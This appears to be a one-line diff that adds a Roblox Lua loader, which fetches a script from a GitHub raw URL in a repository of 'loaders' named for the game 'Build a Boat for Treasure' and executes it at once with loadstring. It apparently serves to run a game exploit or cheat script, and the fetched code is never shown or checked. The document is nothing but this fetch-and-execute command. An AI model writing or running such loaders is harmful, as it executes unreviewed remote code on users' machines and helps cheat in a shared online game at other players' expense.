@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/build-a-boat-for-treasure-spam0-ll43e4peo0xld3.lua"))()
